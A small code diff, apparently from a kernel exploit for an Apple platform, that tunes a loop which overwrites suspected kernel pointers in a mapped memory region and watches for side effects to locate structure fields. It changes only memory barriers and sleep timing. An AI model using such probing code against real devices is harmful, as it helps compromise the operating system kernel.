@@ -549,13 +549,15 @@ static BOOL isKernelPointer(uint64_t v) {
             if (!isKernelPointer(v) || v == 0xffffffffffffffffULL) continue;
 
             rp[i] = v + 0x100;
-            usleep(100);
+            __sync_synchronize();
+            usleep(50);
             int nd = 0;
             for (size_t j = 0; j < words; j++) {
                 if (j != i && rp[j] != snap[j]) nd++;
             }
             rp[i] = v;
-            usleep(50);
+            __sync_synchronize();
+            usleep(10);
 
             if (nd > bestDiffs) {
                 bestDiffs = nd;
